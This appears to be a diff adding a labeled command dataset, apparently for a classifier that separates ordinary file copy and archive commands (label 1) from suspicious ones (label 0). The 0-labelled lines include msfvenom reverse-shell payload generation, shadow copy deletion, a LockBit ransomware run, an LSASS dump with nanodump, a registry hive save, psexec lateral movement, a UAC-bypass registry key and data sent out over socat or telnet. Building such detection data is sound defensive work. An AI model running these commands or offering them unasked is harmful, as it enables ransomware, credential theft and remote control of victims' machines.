@@ -1,0 +1,60 @@
+1	dir ${source_file_path} -Recurse | Compress-Archive -DestinationPath ${destination_file_path}
+1	7z a archive.7z ${source_file_path}
+1	cp -r ${source_directory} ${destination_directory}
+1	copy ${source_file_path} ${destination_file_path}
+1	Copy-Item ${source_file_path} -Destination ${destination_file_path}
+1	Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse
+1	Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
+1	tar -cvzf archive.tar.gz ${source_directory}
+1	tar -cvf archive.tar ${source_directory}
+1	tar -cvfW archive.tar ${source_directory}
+1	tar -zcvf archive.tar.gz ${source_directory}
+1	zip -r archive.zip ${source_directory}
+1	zip archive.zip ${source_file_path}
+1	zip -q archive.zip ${source_file_path}
+1	zip -m archive.zip ${source_file_path}
+1	zip -er archive.zip ${source_directory}
+1	zip -e archive.zip ${source_file_path}
+1	cp ${source_file_path} ${destination_file_path}
+1	powershell -c "copy ${source_file_path} ${destination_file_path}"
+1	compress ${source_file_path}
+1	rar a archive.rar ${source_directory}
+1	7z a archive.7z ${source_file_path} -p${password}
+1	7z a archive.zip ${source_file_path}
+1	7z a archive.zip ${source_file_path} -p${password}
+1	7z a archive.7z ${source_directory}
+1	7z a archive.7z ${source_directory} -p${password}
+1	powershell -c "Copy-Item ${source_file_path} -Destination ${destination_file_path}"
+1	powershell -c "Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse"
+1	Copy-Item ${source_file_path} -Destination ${destination_file_path} -Recurse -Container
+1	cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
+0	cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
+0	telnet ${ip_address} ${port} < ${source_file_path}
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	powershell -c "vssadmin create shadow /for=C:"
+0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+0	powershell -c "taskkill.exe /f /im ${process_name}"
+0	powershell -c "choco install -y putty"
+0	cat email.txt | sendmail ${username}@${domain}
+0	[System.Environment]::UserName
+0	socat - TCP:${ip_address}:${port} < ${source_file_path}
+0	wmic group get name
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ${value_name} /t REG_DWORD /d ${value}
+0	powershell -c "wmic.exe shadowcopy delete"
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	reg SAVE HKLM\SYSTYEM ${local_file_path}
+0	vssadmin.exe delete shadows /all /quiet
+0	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "${command_to_execute}"; New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+0	sc.exe stop ${service_name}
+0	powershell -c "choco install putty"
+0	powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
+0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+0	lockbit.exe -pass ${password}
+0	nanodump.x64.exe -w lsassdump.dmp
